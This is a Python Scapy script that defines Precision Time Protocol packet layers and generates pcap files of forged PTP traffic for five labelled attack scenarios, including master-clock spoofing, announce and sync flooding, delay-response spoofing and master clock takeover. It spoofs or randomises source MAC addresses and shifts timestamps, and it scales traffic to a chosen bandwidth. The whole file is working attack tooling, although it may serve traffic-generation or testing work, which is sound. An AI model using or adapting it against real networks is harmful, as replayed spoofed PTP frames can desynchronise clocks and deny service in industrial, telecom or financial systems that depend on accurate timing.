import random
import math
import time
import argparse
from scapy.all import *

class ptp(Packet):
    name = "ptp common header"
    fields_desc = [
        BitField('transportSpecific', 1, 4),
        BitField('messageType', 0x0, 4),
        ByteField('versionPTP', 2),
        LenField('messageLength', 0, fmt="H"),
        ByteField('subdomainNumber', 0),
        ByteField('dummy1', 0),
        XShortField('flags', 0),
        LongField('correction', 0),
        IntField('dummy2', 0),
        XLongField('ClockIdentity', 0),
        XShortField('SourcePortId', 0),
        XShortField('sequenceId', 0),
        ByteField('control', 0),
        SignedByteField('logMessagePeriod', 0)
    ]

    def guess_payload_class(self, p):
        if self.messageType == 0x0:
            return sync_message
        elif self.messageType == 0x9:
            return delay_resp_message    
        elif self.messageType == 0xb:
            return announce_message
        else:
            return Ether.guess_payload_class(self, p)            

class announce_message(Packet):
    name = "announce message"
    fields_desc = [
        Field('TimestampSec', 0, fmt='6s'),
        IntField('TimestampNanoSec', 0),
        XShortField('currentUtcOffset', 0),
        ByteField('reserved', 0),
        ByteField('grandmasterPriority1', 0),
        IntField('grandmasterClockQuality', 0),
        ByteField('grandmasterPriority2', 0),
        LongField('grandmasterIdentity', 0),
        XShortField('stepsRemoved', 0),
        ByteField('timeSource', 0)
    ]
    def extract_padding(self, p):
        return "", p


class sync_message(Packet):
    name = "sync message"
    fields_desc = [
        Field('TimestampSec', 0, fmt='6s'),
        IntField('TimestampNanoSec', 0)
    ]
    def extract_padding(self, p):
        return "", p

class delay_resp_message(Packet):
    name = "delay response message"
    fields_desc = [
        Field('TimestampSec', 0, fmt='6s'),
        IntField('TimestampNanoSec', 0)
    ]
    def extract_padding(self, p):
        return "", p

bind_layers(Ether, ptp, type=0x88f7)
#bind_layers(ptp, sync_message, type=0b0000)
#bind_layers(ptp, announce_message, type=0b1011)
SCENARIO_TYPE = {
    1: "Master Spoof DoS", # 1 Announce Message with 4 Sync Messages, minimum unit is 78 + 4 * 60 = 318 bytes
    2: "Announce Packet DoS", # 1 Announce Message, minimum unit is 78 = 78 bytes
    3: "SYNC Packet DoS", # 1 Sync Message, minimum unit is 60 = 60 bytes
    4: "Delay_Resp Spoof DoS", # 1 Delay_Resp Message, minimum unit is 60 = 60 bytes
    5: "Master Clock Takeover" # 1 Announce Message with 4 Sync Messages, minimum unit is 78 + 4 * 60 = 318 bytes
}

MINIMUM_UNIT = {
    1: 318,
    2: 78,
    3: 60,
    4: 60,
    5: 318
}

## Random MAC Generator
def random_mac():
    return "8c:0c:87:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def count_mbps(packets, mbps):
    
    packets_length = 0
    for packet in packets:
        packets_length += len(packet)
    count_runs = (mbps*1000000)/packets_length
    count_runs = math.ceil(count_runs)
    return count_runs 

def modify_packet(packets, args):
    if args.src != None:
        for packet in packets: 
            packet.src = args.src
    elif arg.r != None:
        for packet in packets:
            packet.src = random_mac()
    if args.dst != None:
	      for packet in packets:
	          packet.dst = args.dst


def generate_sync_message(src, dst, sequenceId, clockidentity):
    t = time.time_ns()
    t_sec = int(t/1000000000)+random.randint(500, 1000)
    t_nsec = int(t%1000000000)+random.randint(500, 1000)
    padding = b'\x00' * 2
    p = Ether(src=src, dst=dst)/ptp(messageType=0x0, messageLength=44, subdomainNumber=24, SourcePortId=1,
        sequenceId=sequenceId, ClockIdentity=clockidentity, correction=random.randint(0,pow(10,6)))/sync_message(TimestampSec=t_sec.to_bytes(6, byteorder='big'), TimestampNanoSec=t_nsec)/Raw(padding)
    return p
def generate_announce_message(src, dst, sequenceId, clockidentity, timeSource):
    t = time.time_ns()
    t_sec = int(t/1000000000)+random.randint(500, 1000)
    t_nsec = int(t%1000000000)+random.randint(500, 1000)
    p = Ether(src=src, dst=dst)/ptp(messageType=0xb, messageLength=64, subdomainNumber=24, SourcePortId=1,
        sequenceId=sequenceId, ClockIdentity=clockidentity, control=5, correction=random.randint(0,pow(10,6)))/announce_message(
        TimestampSec=t_sec.to_bytes(6, byteorder='big'), TimestampNanoSec=t_nsec, currentUtcOffset=0x25,
        grandmasterPriority1=128, grandmasterClockQuality=0x06214e5d, grandmasterPriority2=128, grandmasterIdentity=0x8c0c87fffe6cfb4f, stepsRemoved=0,timeSource=timeSource)
    return p
def generate_delay_resp_message(src, dst, sequenceId, clockidentity):
    t = time.time_ns()
    t_sec = int(t/1000000000)+random.randint(500, 1000)
    t_nsec = int(t%1000000000)+random.randint(500, 1000)
    padding = b'\x00' * 2
    p = Ether(src=src, dst=dst)/ptp(messageType=0x9, messageLength=44, subdomainNumber=24, SourcePortId=1,
        sequenceId=sequenceId, ClockIdentity=clockidentity, correction=random.randint(0,pow(10,6)))/delay_resp_message(TimestampSec=t_sec.to_bytes(6, byteorder='big'), TimestampNanoSec=t_nsec)/Raw(padding)
    return p


def nexr_seq_id(id):
    if id >= 65535:
        return 0
    else:
        return id + 1


def generate_output_pcap(args):
    count_runs = args.mbps*1000000/MINIMUM_UNIT[args.type]
    count_runs = math.ceil(count_runs)
    packets = []
    announce_start = random.randint(0, 65535)
    delay_start = random.randint(0, 65535)
    sync_start = random.randint(0, 65535)
    for i in range(count_runs):
        if args.r == True:
            src = random_mac()
        else:
            src = args.src    
        if args.type == 1:
            packets.append(generate_announce_message(src, args.dst, announce_start, 0x8c0c87fffe6cfb4f, 0x10))
            announce_start = nexr_seq_id(announce_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
        elif args.type == 2:
            packets.append(generate_announce_message(src, args.dst, announce_start, 0x8c0c87fffe6cfb4f, 0x10))
            announce_start = nexr_seq_id(announce_start)
        elif args.type == 3:
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
        elif args.type == 4:
            packets.append(generate_delay_resp_message(src, args.dst, delay_start, 0x8c0c87fffe6cfb4f))
            delay_start = nexr_seq_id(delay_start)
        elif args.type == 5:
            packets.append(generate_announce_message(src, args.dst, announce_start, 0x8c0c87fffe6cfb4f, 0x10))
            announce_start = nexr_seq_id(announce_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
            packets.append(generate_sync_message(src, args.dst, sync_start, 0x8c0c87fffe6cfb4f))
            sync_start = nexr_seq_id(sync_start)
    wrpcap(args.out, packets)

if __name__=="__main__":
    parser = argparse.ArgumentParser()
    #parser.add_argument("--pcap", type=str, required=True, help="List of input pcap files to merge")
    parser.add_argument("--out", type=str, required=True, help="Name of the output file")
    parser.add_argument("--mbps", type=int, required=True, help="Traffic volume of the output file in Mbps")
    parser.add_argument("--src", type=str, required=True, help="Change the source MAC address of the frames")
    parser.add_argument("--dst", type=str, required=True, help="Change the destination MAC address of the frames")
    parser.add_argument("--r", action="store_true", required=False, help="use random MAC address for the source")
    parser.add_argument("--type", type=int, required=True, help="The scenario of the attack. Example: Master Spoof DoS: 1, Announce Packet DoS: 2, SYNC Packet DoS: 3, Delay_Resp Spoof DoS:4, Master Clock Takeover: 5")
    #parser.add_argument("", type=str, required=True, help="")
    args=parser.parse_args()
    #pcap_list = []
    #for s in args.pcap.spilt(","):
    #    pcap_list.append(s)
    generate_output_pcap(args=args)
